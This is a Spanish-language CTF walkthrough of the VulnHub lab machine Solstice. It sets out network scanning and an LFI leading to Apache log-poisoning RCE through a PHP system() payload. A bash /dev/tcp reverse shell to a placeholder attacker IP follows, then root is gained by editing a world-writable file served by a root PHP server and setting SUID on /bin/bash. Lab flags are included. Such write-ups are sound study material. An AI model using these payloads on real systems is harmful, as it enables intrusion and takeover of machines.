---
tags:
  - type/writeup
  - estado/completo
plataforma: "[[VulnHub]]"
web: https://www.vulnhub.com/solstice
dificultad: Fácil
os: Linux
relacionados:
  - "[[servidor php]]"
  - "[[File Inclusion|LFI]]"
  - "[[Log Poisoning]]"
  - "[[RCE]]"
  - "[[SUID]]"
  - "[[netstat]]"
  - "[[ps]]"
---
#  VulnHub - Solstice

## Reconocimiento

### Detección de IP en la Red Local (ARP Scan)

**Comando:**  
```bash
sudo arp-scan --localnet
```  
**Explicación:**  
- **`arp-scan`** envía solicitudes ARP a toda la red para identificar dispositivos activos.  
- **`--localnet`** escanea todas las interfaces de red locales.  
- **Objetivo:** Encontrar la IP de la máquina objetivo (Ej: `192.168.56.121`).

### Confirmación de Actividad (Ping)

**Comando:**  
```bash
ping -c 1 192.168.56.121
```  
**Explicación:**  
- **`-c 1`** envía un solo paquete ICMP para verificar si la máquina responde.  
- Si hay respuesta, el host está activo y listo para escaneos posteriores.

---

### Escaneo de Puertos con Nmap

#### Detección Rápida de Puertos Abiertos

**Comando:**  
```bash
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.56.121 -oG nmap/allports
```  
**Parámetros Clave:**  
- **`-p-`**: Escanea todos los puertos (1-65535).  
- **`--open`**: Muestra solo puertos abiertos.  
- **`-sS`**: Escaneo SYN sigiloso (no completa conexiones TCP).  
- **`--min-rate 5000`**: Acelera el escaneo enviando 5000 paquetes/segundo.  
- **`-n`**: Sin resolución DNS.  
- **`-Pn`**: Omite detección de host (útil si el firewall bloquea ICMP).  

**Salida Relevante (Ejemplo):**  
```
# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)
Host: 192.168.56.121 () Status: Up
Open Ports: 21,22,25,80,139,445,2121,3128,8593,54787,62524
```

#### Escaneo Detallado de Puertos Específicos

**Comando:**  
```bash
nmap -sVC -p21,22,25,80,139,445,2121,3128,8593,54787,62524 -oN nmap/target 192.168.56.121
```  
**Parámetros Clave:**  
- **`-sVC`**: Detecta versiones de servicios (`-sV`) y ejecuta scripts básicos (`-sC`).  
- **`-oN`**: Guarda el resultado en formato normal.  

**Resultados Destacados:**  
```
21/tcp    open  ftp        vsftpd 3.0.3  
80/tcp    open  http       Apache httpd 2.4.38  
2121/tcp  open  ftp        ProFTPD 1.3.6 (Anonymous login allowed)  
8593/tcp  open  http       Apache httpd 2.4.38  
```

---

### Enumeración Web

#### Enumeración en Puerto 80

**Comando:**  
```bash
gobuster dir -u http://192.168.56.121 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x php,txt,html
```  
**Parámetros Clave:**  
- **`dir`**: Modo de enumeración de directorios.  
- **`-w`**: Wordlist utilizada.  
- **`-t 50`**: 50 hilos para acelerar el proceso.  
- **`-x`**: Extensiones a probar (php, txt, html).  

**Resultados:**  
```
/secret               (Status: 403)  
/index.html           (Status: 200)  
```

#### Enumeración en Puerto 8593

**Comando:**  
```bash
gobuster dir -u http://192.168.56.121:8593 -w /usr/share/wordlists/dirb/common.txt -t 50 -x php
```  
**Hallazgos:**  
```
/index.php            (Status: 200)  
/book.php             (Status: 302)  
```

---

## Explotación de Vulnerabilidades

### Local File Inclusion (LFI) en Puerto 8593

**Prueba de LFI:**  
```bash
curl "http://192.168.56.121:8593/index.php?book=../../../../etc/passwd"
```  
**Resultado:**  
```
root:x:0:0:root:/root:/bin/bash  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
```

### Log Poisoning para RCE

**1. Inyección de PHP en User-Agent:**  
```bash
curl -A "<?php system(\$_GET['cmd']);?>" http://192.168.56.121/
```  

**2. Ejecución de Comando Arbitrario:**  
```bash
curl "http://192.168.56.121:8593/index.php?book=../../../../var/log/apache2/access.log&cmd=id"
```  
**Resultado:**  
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Escalada de Privilegios

### Acceso como www-data

**Reverse Shell:**  
```bash
# En el parámetro cmd:
bash -c 'bash -i >& /dev/tcp/ATACANTE_IP/443 0>&1'
```  
**Conexión:**  
```bash
nc -nlvp 443
```

### Buscando la vulnerabilidad 

#### Permiso SUID

```bash
find / -perm -4000 2>/dev/null
```
Encuentro varios directorios dudosos, entre esos el siguiente. 
```
/var/tmp/sv
```

>[!tip] 
>El SUID en directorios no tiene un uso funcional, simplemente está en la maquina para facilitar encontrar la posible vulnerabilidad.

#### Puertos

```bash
netstat -nat
```

#### Procesos

```bash
ps -faux | grep "/var/tmp/sv"
```
```
root                          \_ /bin/sh -c /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
root                               \_ /usr/bin/php -S 127.0.0.1:57 -t /var/tmp/sv/
```
Veo que por el puerto 57 que es un proceso interno de la maquina (lo vi anteriormente con el comando anterior `netstat -nat`) se está ejecutando un servidor php. 

>[!Tip]
La vulnerabilidad acá está en que al ser root quien ejecuta el servidor, si en algún lado puedo insertar código php, podría lograr acceso como root. 

#### Carpeta /var/tmp/sv

**Dentro del `index.php`:**
```bash
-rwxrwxrwx 1 root root 41 Feb  5 21:46 index.php
```
```
<?php
	echo "under construction"
?>
```

**Pruebas con el `index.php`:**
```
<?php
	system("whoami")
?>
```

**Ejecución del Servicio:**  
```
curl http://127.0.0.1:57
```
Devuelve `root` debido a que es root el que está ejecutando el servicio. 

### Abuso de Servicio PHP como Root

**Asigno SUID a la bash:**  
```
<?php
	system("chmod u+s /bin/bash")
?>
```

**Ejecución del Servicio:**  
```bash
curl http://localhost:57/  
```  

**Shell como Root:**  
```bash
bash -p
```

## Bandera(s)

> [!flag] `flag{user}`
c0e1f61ff8e753d8b27615bdc4f25794
^bandera-user

> [!flag] `flag{root}`
f950998f0d484a2ef1ea83ed4f42bbca
^bandera-root

